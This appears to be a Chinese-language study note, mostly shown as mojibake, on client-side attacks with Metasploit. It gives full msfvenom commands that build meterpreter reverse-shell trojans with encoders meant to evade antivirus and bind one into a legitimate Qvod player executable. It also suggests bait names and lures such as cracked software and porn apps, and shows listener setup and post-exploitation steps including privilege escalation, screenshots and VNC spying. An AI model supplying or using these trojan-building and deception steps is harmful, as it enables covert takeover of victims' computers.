å®¢æˆ·ç«¯æ¸—é€åŸç†
ç¤¾ä¼šå·¥ç¨‹å­¦ï¼Œè¯±éª—æ‰§è¡Œæ¶æ„ç¨‹åº
ä¼ªè£…ï¼›å…æ€æŠ€æœ¯èº²é¿å®‰å…¨è½¯ä»¶
å…æ€ï¼šä¿®æ”¹äºŒè¿›åˆ¶è½¯ä»¶æ•°æ®åº“ï¼›åŠ å¯†ï¼Œç‰¹å¾å­—ç¬¦ä¸å¯è¯»ï¼›ç»•è¿‡æ€æ¯’è½¯ä»¶
å·¥å…·ï¼šåé—¨å·¥å‚

Windowsæ¶æ„è½¯ä»¶è·å–shell
å·¥å…·msfvenomæ˜¯msfpayloadï¼Œmsfencodeçš„ç»“åˆï¼Œåˆ©ç”¨msfvenomç”Ÿæˆæœ¨é©¬ï¼Œå¹¶åœ¨ç›®æ ‡æœºæ‰§è¡Œï¼Œåœ¨æœ¬åœ°ç›‘å¬ä¸Šçº¿
venmomæ¯’æ¶²

msfvenomç”Ÿæˆè¥¿ç“œå½±éŸ³å’Œå¿«æ’­
æ€è·¯ï¼š
kaliï¼š
  handlerã€payload
  åœ¨192.168.1.53:4444ç«¯å£ç›‘å¬åé—¨è¯·æ±‚
win7é¶æœºï¼šè¿è¡Œè¥¿ç“œè§†é¢‘.exe

##ä¸€ä¸ªç¼–ç å™¨
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.180 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/è¥¿ç“œè§†é¢‘1.exe
#x86ï¼Œxæ˜¯å°å†™
-a æŒ‡å®šæ¶æ„
x86 32ä½ï¼›64ä½ä¹Ÿèƒ½æ‰§è¡Œ
-p payload æŒ‡å®šæ”»å‡»è½½è·;meterpreteræ¯”shellåŠŸèƒ½æ›´å¼ºå¤§
  msfvenom --list payloads to list | grep -i reverse_tcp | grep -i meterpreter
  æŸ¥çœ‹è½½è·ï¼›meterpreteræ¯”shellæ›´å¼ºå¤§ï¼Œä¸åŒºåˆ†winå’ŒLinux
-b å»æ‰åå­—ç¬¦ï¼›\x00 16è¿›åˆ¶çš„ç©º
-e æŒ‡å®šç¼–ç å™¨ï¼›å…æ€
-iç¼–ç æ¬¡æ•°ï¼Œæ•°å­—è¶Šå¤§ï¼Œæ–‡ä»¶è¶Šå¤§
-fæŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„æ ¼å¼ï¼›rawï¼Œexeï¼Œelfï¼Œjarï¼Œcè¯­è¨€
-oæŒ‡å®šè¾“å‡ºä½ç½®


##ä¸¤ä¸ªç¼–ç å™¨
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.180 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 20 | msfvenom -a X86 --platform windows -e x86/alpha_upper -i 10 -f exe -o /var/www/html/è¥¿ç“œè§†é¢‘2.exe

åŒæ—¶æ”¯æŒå¤šä¸ªï¼Œæå¤šä¸ªç«¯å£


åœ¨çº¿ç—…æ¯’æ£€æµ‹ç½‘ç«™
https://www.virscan.org
https://www.virustotal.com/gui/home/upload



#############â€”â€”â€”â€”ã€‹ç›‘å¬
msfdb run
msf6 > search multi/msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.53
è·Ÿç”Ÿæˆæœ¨é©¬çš„ä¸€è‡´
msf6 exploit(multi/handler) > run
è®¾ç½®è½½è·ï¼Œè·Ÿæœ¨é©¬çš„è½½è·ä¸€è‡´
meterpreter > getuid
windowsçš„ä¸‰ç§æƒé™ï¼šuserã€administratorã€system
meterpreter > help
meterpreter > getsystem
ææƒ
meterpreter > getpid
æœ¨é©¬è¿›ç¨‹
meterpreter > ps
è‚‰é¸¡è¿›ç¨‹
meterpreter > sysinfo
ç³»ç»Ÿä¿¡æ¯
meterpreter > screenshot
æˆªå›¾
meterpreter > run vnc
è¿œç¨‹æŸ¥çœ‹è‚‰é¸¡ï¼›å®æ—¶ç›‘æ§

########################################â€”â€”â€”â€”ã€‹æ¨¡æ‹Ÿç»™æ­£å¸¸è½¯ä»¶åŠ åé—¨
ç±»ä¼¼winæ¿€æ´»å·¥å…·ã€ç§æœå®¢æˆ·ç«¯ã€ç›—ç‰ˆæ¸¸æˆã€çœ‹ç‰‡ç¥å™¨ã€è£¸èŠç¥å™¨ã€å½©ç¥¨ã€æŠ¢çº¢åŒ…è½¯ä»¶ã€PSæ¿€æ´»å·¥å…·ã€CRTæ¿€æ´»å·¥å…·ã€æ³¨å†Œæœºã€‚ã€‚ã€‚
1.å…ˆä¸‹è½½ä¸€ä¸ªç»¿è‰²ç‰ˆæœ¬ï¼Œå…å®‰è£…çš„å¿«æ’­è½¯ä»¶ï¼›
  ä¸ç”¨è¦æ¤å…¥ä¸»ç¨‹åºï¼Œæ†ç»‘åˆ°å­ç¨‹åºï¼Œå®¹æ˜“å‡ºé”™ï¼›
â”Œâ”€â”€(rootğŸ’€kali-linux-2021-3)-[~]
â””â”€# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.211.55.6 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -x QvodTerminal.exe -f exe -o /var/www/html/QvodTerminal.exe

-p windows/meterpreter/reverse_tcp è½½è·ï¼Œé€šç”¨Linuxå’ŒWindows
x86 xæ˜¯å°å†™
-x æŒ‡å®šè·¯å¾„å’Œæ–‡ä»¶ï¼ˆè·Ÿæ–‡ä»¶æŒ‚é©¬ï¼‰

2.èµ·ä¸ªè¯±äººçš„æ–‡ä»¶å¤¹åç§°
çœ‹ç‰‡ç¥å™¨-å…¨ç½‘å…è´¹-ROOTç›´æ’­-QVODPlayer

3.è‚‰é¸¡æ‰§è¡Œ

4.å¯åŠ¨ç›‘å¬
â”Œâ”€â”€(rootğŸ’€kali-linux-2021-3)-[~]
â””â”€# msfconsole 
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
è½½è·ï¼Œè·ŸæŒ‚é©¬çš„è½½è·ä¸€è‡´
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > set LHOST 10.211.55.6
msf6 exploit(multi/handler) > run

5.è¿œç¨‹æ“ä½œè‚‰é¸¡
meterpreter > getuid
meterpreter > getsystem
meterpreter > getpid

################â€”â€”ã€‹åˆ©ç”¨evasionæ¨¡å—ç”Ÿæˆæœ¨é©¬
evasion é€ƒé¿
1.ç”Ÿæˆæœ¨é©¬æ–‡ä»¶
msf6 > search evasion
msf6 > use evasion/windows/windows_defender_exe
msf6 evasion(windows/windows_defender_exe) > show options
msf6 evasion(windows/windows_defender_exe) > set FILENAME laohe.exe
msf6 evasion(windows/windows_defender_exe) > set payload windows/meterpreter/reverse_tcp
msf6 evasion(windows/windows_defender_exe) > show options
msf6 evasion(windows/windows_defender_exe) > set LHOSTS 10.211.55.6
msf6 evasion(windows/windows_defender_exe) > run
ç”Ÿæˆæœ¨é©¬æ–‡ä»¶ /root/.msf4/local/laohe.exe

msf6 evasion(windows/windows_defender_exe) > exit                                                                                                                                         
â”Œâ”€â”€(rootğŸ’€kali-linux-2021-3)-[~]
â””â”€# mv /root/.msf4/local/laohe.exe /var/www/html

2.å¯åŠ¨ç›‘å¬
msf6 evasion(windows/windows_defender_exe) > use exploit/multi/handler
å¯ä»¥ä¸ç”¨backï¼Œç›´æ¥use
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.211.55.6
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > run
















